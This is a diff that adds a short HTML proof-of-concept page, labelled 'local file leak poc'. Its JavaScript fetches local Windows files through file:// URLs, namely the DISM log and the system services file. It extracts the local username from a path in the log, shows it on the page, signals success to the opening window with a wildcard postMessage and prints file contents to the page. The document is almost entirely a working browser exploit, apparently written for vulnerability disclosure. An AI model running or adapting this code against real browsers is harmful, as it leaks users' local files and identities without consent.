@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<h1>local file leak poc</h1>
+<div id="username"></div>
+<script>
+    const logDiv = document.body.appendChild(document.createElement('div'));
+    const oldLog = console.log;
+
+    console.log = (...args) => {
+        oldLog(...args); // Keeps standard browser console output working
+        logDiv.innerHTML += args.join(' ') + '<br>';
+    };
+ 
+   
+    fetch('file:///c:\\windows\\logs\\dism\\dism.log')
+        .then(resp => resp.text())
+        .then(r => {
+            username = r.match(/Users\\([^\\]+)/)[1];
+            document.getElementById('username').innerText = `Local username leak ${username}`;
+            opener.postMessage('poc_ok', '*');
+        })
+        .catch(() => {
+            window.close();
+        });
+
+
+        fetch('file:///c:\\windows\\system32\\drivers\\etc\\services').then(e => (e.text().then(console.log)));
+
+
+
+</script>
+</html>
+;
